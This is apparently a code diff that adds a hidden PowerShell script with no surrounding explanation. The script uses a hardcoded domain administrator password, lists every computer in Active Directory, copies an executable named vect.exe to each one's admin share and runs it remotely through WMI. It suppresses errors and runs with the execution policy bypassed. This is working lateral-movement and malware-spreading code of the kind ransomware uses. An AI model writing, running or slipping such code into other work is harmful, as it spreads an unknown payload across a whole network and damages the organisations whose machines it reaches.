@@ -1,0 +1,16 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+powershell -NoP -NonI -W Hidden -Exec Bypass -C "$ErrorActionPreference='SilentlyContinue'
+$u='LAB\Administrator';$p='P@ssw0rd123!'
+$src='C:\Users\Admin\AppData\Local\Temp\vect.exe'
+$name='vect.exe'
+$sp=ConvertTo-SecureString $p -AsPlainText -Force
+$cred=New-Object PSCredential($u,$sp)
+$pcs=@([adsisearcher]'objectCategory=computer').FindAll()|%{$_.Properties.dnshostname[0]}|?{$_ -and $_ -ne $env:COMPUTERNAME}
+foreach($pc in $pcs){
+  $dest="\\$pc\C`$\ProgramData\$name"
+  try{
+    Copy-Item $src $dest -Force -EA Stop
+    Invoke-WmiMethod -ComputerName $pc -Credential $cred -Class Win32_Process -Name Create -ArgumentList "C:\ProgramData\$name" -EA Stop
+  }catch{}
+}
+"
